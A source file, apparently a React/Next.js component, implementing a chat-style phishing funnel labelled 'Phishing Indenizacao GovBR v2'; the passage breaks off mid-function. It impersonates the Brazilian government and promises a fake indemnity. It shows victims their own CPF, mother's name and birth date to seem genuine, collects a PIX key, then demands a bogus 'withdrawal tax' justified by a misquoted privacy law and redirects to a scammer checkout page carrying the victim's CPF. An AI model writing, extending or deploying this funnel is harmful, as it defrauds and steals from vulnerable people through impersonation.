
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
}

interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrl?: string;
  style?: string;
}

interface FlowStepDataDisplayVideo {
  message?: string;
  videoUrl: string;
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string;
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayDynamicImage {
    message: string;
    templateUrl?: string;
    dataMapping?: any[];
    imageAiHint?: string;
    imageAltText?: string;
}

interface FlowStep {
  type: 'displayVideo' | 'multipleChoice' | 'loading' | 'displayMessage' | 'textInput' | 'displayDynamicImage';
  delay_ms?: number;
  data: FlowStepDataDisplayVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayDynamicImage;
  nextStep?: string;
  isTerminal?: boolean;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
}

const funnelDefinition: {
  funnelName: string;
  initialStep: string;
  globalVariables: Record<string, string>;
  steps: Record<string, FlowStep>;
} = {
  "funnelName": "Phishing Indenizacao GovBR v2",
  "initialStep": "step1_video",
  "globalVariables": {
    "indenizacaoValor": "R$ 5.960,50",
    "taxaValor": "R$ 61,90",
    "paymentLink": "https://site-do-golpista.com/checkout-pix"
  },
  "steps": {
    "step1_video": {
      "type": "displayVideo",
      "delay_ms": 1000,
      "data": {
        "message": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4",
        "thumbnailText": "Clique para Assistir e Iniciar"
      },
      "nextStep": "step2_intro_and_ask_mother"
    },
    "step2_intro_and_ask_mother": {
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.\n\nResponda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}.\n\nPor favor, confirme o nome de sua mãe.",
        "options": [
          {"text": "{{randomMotherName1}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{randomMotherName2}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{userMotherName}}", "nextStep": "step3_ask_civil_status"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_civil_status"}
        ]
      }
    },
    "step3_ask_civil_status": {
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "Qual seu estado civil?",
        "options": [
          {"text": "Solteiro (a)", "nextStep": "step4_loading_validation"},
          {"text": "Casado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Divorciado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Viúvo (a)", "nextStep": "step4_loading_validation"}
        ]
      }
    },
    "step4_loading_validation": {
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Validando suas respostas...",
        "duration_ms": 3000
      },
      "nextStep": "step5_confirmation_and_audio"
    },
    "step5_confirmation_and_audio": {
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Autenticidade confirmada!",
        "icon": "success_checkmark",
        "details": {
          "Nome": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Indenização": "{{indenizacaoValor}}",
          "Status": "Pré-aprovado"
        },
        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
      },
      "nextStep": "step6_ask_pix_type"
    },
    "step6_ask_pix_type": {
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Para prosseguir, selecione a chave PIX que deseja usar para o recebimento:",
        "options": [
          {"text": "Telefone", "nextStep": "step7_input_pix_key"},
          {"text": "CPF (recomendado)", "nextStep": "step7_confirm_pix_key", "action": "setChavePixToUserCPF"},
          {"text": "Email", "nextStep": "step7_input_pix_key"},
        ]
      }
    },
    "step7_confirm_pix_key": {
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "ATENÇÃO: Verifique se a chave Pix (seu CPF) está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
        "options": [
          {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
          {"text": "Não, desejo usar outra chave.", "nextStep": "step7_input_pix_key"}
        ]
      }
    },
    "step7_input_pix_key": {
      "type": "textInput",
      "delay_ms": 1000,
      "data": {
          "message": "Por favor, digite sua chave PIX:",
          "placeholder": "Digite sua chave PIX aqui",
          "variableToSet": "chavePix"
      },
      "nextStep": "step7b_confirm_manual_pix_key"
    },
    "step7b_confirm_manual_pix_key": {
        "type": "multipleChoice",
        "delay_ms": 1500,
        "data": {
            "message": "ATENÇÃO: Verifique se a chave Pix está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
            "options": [
                {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
                {"text": "Não, desejo corrigir.", "nextStep": "step7_input_pix_key"}
            ]
        }
    },
    "step8_loading_pix_registration": {
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...",
        "duration_ms": 2500
      },
      "nextStep": "step9_pix_registered_and_audio"
    },
    "step9_pix_registered_and_audio": {
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Chave PIX Cadastrada",
        "icon": "success_checkmark",
        "message": "Sua chave pix foi cadastrada com sucesso!",
        "details": {
          "Nome": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Status": "Aprovado"
        },
        "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
      },
      "nextStep": "step10_ask_generate_receipt"
    },
    "step10_ask_generate_receipt": {
      "type": "multipleChoice",
      "delay_ms": 3500,
      "data": {
        "message": "Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.\n\nIremos gerar seu comprovante do valor de {{indenizacaoValor}} neste instante.",
        "options": [
          {"text": "Desejo receber meu comprovante de recebimento.", "nextStep": "step11_generating_receipt_image"}
        ]
      }
    },
    "step11_generating_receipt_image": {
      "type": "displayMessage", // Simplified from displayDynamicImage
      "delay_ms": 1000,
      "data": {
        "message": "Gerando seu comprovante de recebimento dos valores..."
        // "templateUrl": "https://url-do-golpista.com/images/comprovante_template.png",
        // "dataMapping": [
        //   {"variable": "{{userName}}", "x": 50, "y": 120, "font": "Arial", "size": 12},
        //   {"variable": "{{indenizacaoValor}}", "x": 50, "y": 155, "font": "Arial Bold", "size": 14},
        //   {"variable": "{{userCPF}}", "x": 50, "y": 250, "font": "Arial", "size": 10},
        //   {"variable": "{{taxaValor}}", "x": 450, "y": 180, "font": "Arial Bold", "size": 12, "color": "#008000"}
        // ]
      },
      "nextStep": "step12_reveal_tax_and_audio"
    },
    "step12_reveal_tax_and_audio": {
      "type": "displayMessage",
      "delay_ms": 3000,
      "data": {
        "title": "Indenização Governamental",
        "details": {
          "Indenização disponível para saque": "{{indenizacaoValor}}",
          "Titular": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Imposto de Saque": "{{taxaValor}}"
        },
        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
      },
      "nextStep": "step13_final_justification_and_cta"
    },
    "step13_final_justification_and_cta": {
      "type": "multipleChoice",
      "delay_ms": 4000,
      "data": {
        "message": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.\n\nPortanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.\n\nLei n.º 13.709 de 14 de agosto de 2018",
        "options": [
          {
            "text": "Concluir pagamento e receber minha indenização",
            "action": "redirectToPayment",
            "paymentUrl": "{{paymentLink}}"
          }
        ]
      }
    }
  }
};


const STORAGE_KEY_MESSAGES = 'simulatedChatMessages_v2_1';
const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_1';
const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_1';
const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf_v2_1';

const DEFAULT_APPEARANCE_DELAY_MS = 500; // Fallback delay if not specified in step

const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);

  const [flowVariables, setFlowVariables] = useState<Record<string, any>>(() => {
    const initialGlobalVars = funnelDefinition.globalVariables || {};
    return {
        ...initialGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza',
        randomMotherName2: 'Joana Oliveira Costa',
        chavePix: initialParams.cpf || '---.---.---.--',
    };
  });

  const [isBotTyping, setIsBotTyping] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);

  const [showVideoPlaceholderOverlay, setShowVideoPlaceholderOverlay] = useState(true);
  const videoPlaceholderData = useRef<FlowStepDataDisplayVideo | null>(null);
  const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);

  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
  const justLoadedSessionRef = useRef(false);


  useEffect(() => {
    if (typeof window === 'undefined') return;

    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    const storedSessionIdentifier = sessionStorage.getItem(STORAGE_KEY_SESSION_CPF);

    let shouldResetChat = false;

    const defaultGlobalVars = funnelDefinition.globalVariables || {};
    const defaultFlowVars = {
        ...defaultGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza',
        randomMotherName2: 'Joana Oliveira Costa',
        chavePix: initialParams.cpf || '---.---.---.--',
    };

    if (currentCpfFromParams && storedSessionIdentifier === sessionIdentifier) {
      const savedMessages = sessionStorage.getItem(STORAGE_KEY_MESSAGES);
      const savedStep = sessionStorage.getItem(STORAGE_KEY_STEP);
      const savedFlowVars = sessionStorage.getItem(STORAGE_KEY_VARIABLES);

      setMessages(savedMessages ? JSON.parse(savedMessages) : []);
      const stepToSet = (savedStep && funnelDefinition.steps[JSON.parse(savedStep)])
                         ? JSON.parse(savedStep)
                         : funnelDefinition.initialStep;
      setCurrentStepKey(stepToSet);

      const newFlowVariables = { ...defaultFlowVars };
      if (savedFlowVars) {
        const parsedSaved = JSON.parse(savedFlowVars);
        newFlowVariables.chavePix = parsedSaved.chavePix || defaultFlowVars.chavePix;
        Object.keys(defaultGlobalVars).forEach(key => {
            if (parsedSaved[key] !== undefined) newFlowVariables[key] = parsedSaved[key];
        });
      }
      setFlowVariables(newFlowVariables);
      justLoadedSessionRef.current = (savedMessages && savedMessages !== "[]");
    } else {
      shouldResetChat = true;
    }

    if (shouldResetChat) {
      sessionStorage.removeItem(STORAGE_KEY_MESSAGES);
      sessionStorage.removeItem(STORAGE_KEY_STEP);
      sessionStorage.removeItem(STORAGE_KEY_VARIABLES);
      if (currentCpfFromParams) {
        sessionStorage.setItem(STORAGE_KEY_SESSION_CPF, sessionIdentifier);
      } else {
        sessionStorage.removeItem(STORAGE_KEY_SESSION_CPF);
      }
      setMessages([]);
      setCurrentStepKey(funnelDefinition.initialStep);
      setFlowVariables(defaultFlowVars);
      prevCurrentStepKeyRef.current = undefined;
      justLoadedSessionRef.current = false;
    }
  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      sessionStorage.setItem(STORAGE_KEY_MESSAGES, JSON.stringify(messages));
    }
  }, [messages, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
     if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      sessionStorage.setItem(STORAGE_KEY_STEP, JSON.stringify(currentStepKey));
    }
  }, [currentStepKey, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      const persistableFlowVariables: Record<string, any> = {};
      Object.keys(flowVariables).forEach(key => {
        if (key in funnelDefinition.globalVariables || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName'].includes(key)) {
            persistableFlowVariables[key] = flowVariables[key];
        }
      });
      sessionStorage.setItem(STORAGE_KEY_VARIABLES, JSON.stringify(persistableFlowVariables));
    }
  }, [flowVariables, initialParams.cpf, initialParams.nome]);


  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    const allVars = {
        ...initialParams,
        ...(funnelDefinition.globalVariables || {}),
        ...flowVariables,
    };

    for (const key in allVars) {
      const placeholder = `{{${key}}}`;
      let valueToInsert = String(allVars[key]);

      if (valueToInsert !== undefined && valueToInsert !== null && valueToInsert.toLowerCase() !== "null" && valueToInsert.toLowerCase() !== "undefined") {
        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) {
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
        }
        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert && valueToInsert === valueToInsert.toLowerCase()) {
             valueToInsert = valueToInsert
                .split(' ')
                .map(word => word.charAt(0).toUpperCase() + word.slice(1))
                .join(' ');
        }
        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      } else {
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), '---');
      }
    }
    return formattedText;
  };

  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  const handleUserActionAndNavigate = (nextStepKey?: string) => {
    if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
    }
    setCurrentDisplayMessage(null);
    setCurrentImageDetails(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    if (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type !== 'displayVideo') {
        videoPlaceholderData.current = null;
        setCurrentVideoMessage(null);
    }
    setIsTextInputActive(false);
    setCurrentTextInputConfig(null);

    if (nextStepKey && funnelDefinition.steps[nextStepKey as keyof typeof funnelDefinition.steps]) {
        setCurrentStepKey(nextStepKey);
    } else if (nextStepKey) {
        console.error("SimulatedChatFlow: Invalid nextStepKey referenced:", nextStepKey);
    }
  };

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep | undefined;

    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      if (prevCurrentStepKeyRef.current !== currentStepKey && !justLoadedSessionRef.current) {
        setMessages(prev => [...prev, {id: `err-invalid-step-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro interno no fluxo."}]);
      }
      setIsBotTyping(false);
      return;
    }

    setIsBotTyping(true);

    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    let processAsNewStep = (isNewStep && !justLoadedSessionRef.current) ||
                           (justLoadedSessionRef.current && stepConfig.type === 'displayVideo' && isNewStep);

    if (isNewStep && !(justLoadedSessionRef.current && stepConfig.type === 'displayVideo')) {
      setIsLoadingStep(false);
      setLoadingMessage(null);
      setCurrentImageDetails(null);
      setCurrentDisplayMessage(null);
      setIsTextInputActive(false);
      setCurrentTextInputConfig(null);
      if (stepConfig.type !== 'displayVideo') {
        videoPlaceholderData.current = null;
        setCurrentVideoMessage(null);
      }
    }

    const effectiveAppearanceDelay = stepConfig.delay_ms ?? DEFAULT_APPEARANCE_DELAY_MS;

    const typingTimer = setTimeout(() => {
      const processStepAfterDelayInternal = () => {
        if (processAsNewStep) {
          switch (stepConfig.type) {
            case 'displayVideo': {
              const data = stepConfig.data as FlowStepDataDisplayVideo;
              setCurrentVideoMessage(formatText(data.message));
              videoPlaceholderData.current = { ...data, thumbnailText: data.thumbnailText || "Clique para Assistir" };
              setShowVideoPlaceholderOverlay(true);
              // No setIsBotTyping(false) here; wait for user interaction
              return;
            }
            case 'multipleChoice': {
              const data = stepConfig.data as FlowStepDataMultipleChoice;
              const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
              break;
            }
            case 'loading': {
              const data = stepConfig.data as FlowStepDataLoading;
              setLoadingMessage(formatText(data.message));
              setIsLoadingStep(true);
              autoTransitionTimerRef.current = setTimeout(() => {
                if (prevCurrentStepKeyRef.current === currentStepKey) {
                  setIsLoadingStep(false);
                  setLoadingMessage(null);
                  if (stepConfig.nextStep) handleUserActionAndNavigate(stepConfig.nextStep);
                }
              }, data.duration_ms);
              setIsBotTyping(false); // Loading itself is the content
              return;
            }
            case 'displayMessage': {
              const data = stepConfig.data as FlowStepDataDisplayMessage;
              const displayMsgData: Message = {
                id: `bot-msg-${Date.now()}`, sender: 'bot',
                displayTitle: formatText(data.title),
                text: data.message ? formatText(data.message) : undefined,
                displayDetails: formatDetailsObject(data.details),
                displayIcon: data.icon,
              };
              setCurrentDisplayMessage(displayMsgData);
              if (data.audioUrl && audioRef.current) {
                audioRef.current.src = data.audioUrl;
                audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
              }
              break;
            }
            case 'textInput': {
              const data = stepConfig.data as FlowStepDataTextInput;
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
              setCurrentTextInputConfig(data);
              setIsTextInputActive(true);
              setTextInputValue("");
              // No setIsBotTyping(false) here; wait for user input
              return;
            }
            case 'displayDynamicImage': {
              console.warn("SimulatedChatFlow: 'displayDynamicImage' step type is simplified. Actual image generation with text overlay is not implemented.");
              const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
              const messageToShow = formatText(data.message) || "Gerando seu comprovante...";
               if (data.templateUrl) {
                setCurrentImageDetails({
                    url: data.templateUrl,
                    alt: formatText(data.imageAltText) || "Comprovante",
                    message: messageToShow,
                    aiHint: data.imageAiHint
                });
              } else {
                setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
              }
              break;
            }
            default:
              console.error("SimulatedChatFlow: Unknown step type in processAsNewStep:", (stepConfig as any).type);
              setMessages(prev => [...prev, {id: `err-type-new-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
          }
        } else if (isNewStep && justLoadedSessionRef.current) {
          if (stepConfig.type === 'multipleChoice') {
            const lastMessage = messages[messages.length - 1];
            const data = stepConfig.data as FlowStepDataMultipleChoice;
            const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
            if (messages.length === 0 || (lastMessage && lastMessage.sender === 'user') || (lastMessage && !lastMessage.options) || (lastMessage && stepConfig.type === 'multipleChoice' && (lastMessage.text !== formatText(data.message) || JSON.stringify(lastMessage.options) !== JSON.stringify(formattedOptions)))) {
               setMessages(prev => [...prev, { id: `bot-session-load-opts-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
            }
          } else if (stepConfig.type === 'textInput') {
            setCurrentTextInputConfig(stepConfig.data as FlowStepDataTextInput);
            setIsTextInputActive(true);
            const lastMessage = messages[messages.length - 1];
             if(!lastMessage || lastMessage.sender === 'user' || lastMessage.text !== formatText((stepConfig.data as FlowStepDataTextInput).message)) {
                setMessages(prev => [...prev, { id: `bot-session-load-text-input-${Date.now()}`, sender: 'bot', text: formatText((stepConfig.data as FlowStepDataTextInput).message) }]);
             }
          } else if (stepConfig.type === 'displayMessage'){
              const data = stepConfig.data as FlowStepDataDisplayMessage;
               const displayMsgData: Message = {
                id: `bot-session-load-disp-${Date.now()}`, sender: 'bot',
                displayTitle: formatText(data.title),
                text: data.message ? formatText(data.message) : undefined,
                displayDetails: formatDetailsObject(data.details),
                displayIcon: data.icon,
              };
              setCurrentDisplayMessage(displayMsgData);
          }  else if (stepConfig.type === 'displayDynamicImage') {
              const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
              const messageToShow = formatText(data.message) || "Gerando comprovante...";
               if (data.templateUrl) {
                    setCurrentImageDetails({
                        url: data.templateUrl,
                        alt: formatText(data.imageAltText) || "Comprovante",
                        message: messageToShow,
                        aiHint: data.imageAiHint
                    });
                } else {
                    const lastMessage = messages[messages.length - 1];
                    if(!lastMessage || lastMessage.sender === 'user' || lastMessage.text !== messageToShow) {
                        setMessages(prev => [...prev, { id: `bot-session-load-dynimg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
                    }
                }
          }
        } else {
          if (currentDisplayMessage) {
             const data = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage;
              if (data && data.type === 'displayMessage') {
                   setCurrentDisplayMessage(prev => prev ? {
                      ...prev,
                      displayTitle: formatText(data.title),
                      text: data.message ? formatText(data.message) : undefined,
                      displayDetails: formatDetailsObject(data.details),
                  } : null);
              }
          }
          if (messages.length > 0 && !isTextInputActive && !videoPlaceholderData.current && !isLoadingStep && !currentDisplayMessage && !currentImageDetails) {
              const lastMessage = messages[messages.length -1];
              if (lastMessage.sender === 'bot' && lastMessage.options && stepConfig.type === 'multipleChoice') {
                   const data = stepConfig.data as FlowStepDataMultipleChoice;
                   if (data && data.options) {
                       setMessages(prevMsgs => prevMsgs.map((msg, index) => {
                          if (index === prevMsgs.length -1) {
                              return { ...msg, text: formatText(data.message), options: data.options.map(opt => ({ ...opt, text: formatText(opt.text) })) };
                          }
                          return msg;
                       }));
                   }
              } else if (lastMessage.sender === 'bot' && !lastMessage.options && (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage')) {
                  const data = stepConfig.data as (FlowStepDataDisplayMessage | FlowStepDataDisplayDynamicImage);
                  if (data && data.message && !(data as FlowStepDataDisplayMessage).title && !(data as FlowStepDataDisplayMessage).details && stepConfig.type !== 'displayDynamicImage') {
                       setMessages(prevMsgs => prevMsgs.map((msg, index) => {
                          if (index === prevMsgs.length -1) { return { ...msg, text: formatText(data.message!) }; }
                          return msg;
                       }));
                  }
              }
          }
        }

        const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                  (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');

        let nextStepTransitionDelayMs = stepConfig.type === 'displayMessage' ? 4500 : (stepConfig.type === 'displayDynamicImage' ? 3000 : 0);
        if (stepConfig.type === 'displayMessage' && !(stepConfig.data as FlowStepDataDisplayMessage).details) {
            nextStepTransitionDelayMs = (stepConfig.data as FlowStepDataDisplayMessage).message ? 2500 : 1200;
        }


        if (canAutoTransition && (processAsNewStep || (isNewStep && justLoadedSessionRef.current))) {
          autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) {
               handleUserActionAndNavigate(stepConfig.nextStep as string);
            }
          }, nextStepTransitionDelayMs);
        }
        setIsBotTyping(false); // Content is now ready or waiting for interaction
      };

      processStepAfterDelayInternal();

      if (justLoadedSessionRef.current && isNewStep) {
          justLoadedSessionRef.current = false;
      }

    }, effectiveAppearanceDelay);

    if (isNewStep) {
      prevCurrentStepKeyRef.current = currentStepKey;
    }

    return () => {
      clearTimeout(typingTimer);
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  }, [currentStepKey, initialParams]);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, loadingMessage, currentImageDetails, currentDisplayMessage, currentVideoMessage, isTextInputActive, isBotTyping]);


  const handleOptionClick = (option: ChatOption) => {
    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const userMessageText = option.text || "Opção selecionada"; // Fallback for safety
    const userMessageId = `user-${Date.now()}`;

    setMessages(prevMsgs => {
      const msgsWithUserReply = [...prevMsgs, { id: userMessageId, sender: 'user', text: userMessageText }];
      let repliedToBotMessageIndex = -1;
      for (let i = msgsWithUserReply.length - 2; i >= 0; i--) {
        if (msgsWithUserReply[i].sender === 'bot' && msgsWithUserReply[i].options && msgsWithUserReply[i].options.length > 0) {
          repliedToBotMessageIndex = i;
          break;
        }
      }

      if (repliedToBotMessageIndex !== -1) {
        const finalMsgs = [...msgsWithUserReply];
        const updatedBotMessage = { ...finalMsgs[repliedToBotMessageIndex], options: undefined };
        finalMsgs[repliedToBotMessageIndex] = updatedBotMessage;
        return finalMsgs;
      }
      return msgsWithUserReply;
    });

    setCurrentDisplayMessage(null);
    setCurrentImageDetails(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    videoPlaceholderData.current = null;
    setCurrentVideoMessage(null);
    setIsTextInputActive(false);
    setCurrentTextInputConfig(null);

    setIsBotTyping(true);

    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = flowVariables.userCPF || "CPF não disponível";
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    }

    if (option.action === 'redirectToPayment' && option.paymentUrl) {
        let finalPaymentUrl = formatText(option.paymentUrl);
        try {
            const url = new URL(finalPaymentUrl);
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value as string);
                }
            });
            if (initialParams.cpf && !url.searchParams.has('cpf')) url.searchParams.set('cpf', initialParams.cpf);
            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento." }]);
        }
        setIsBotTyping(false);
        return;
    }

    if (option.nextStep) {
      handleUserActionAndNavigate(option.nextStep);
    } else if (!option.action) {
        console.warn("SimulatedChatFlow: Option clicked with no nextStep and no action:", option);
        setIsBotTyping(false);
    }
  };

  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    if (stepConfig?.type !== 'displayVideo') return;

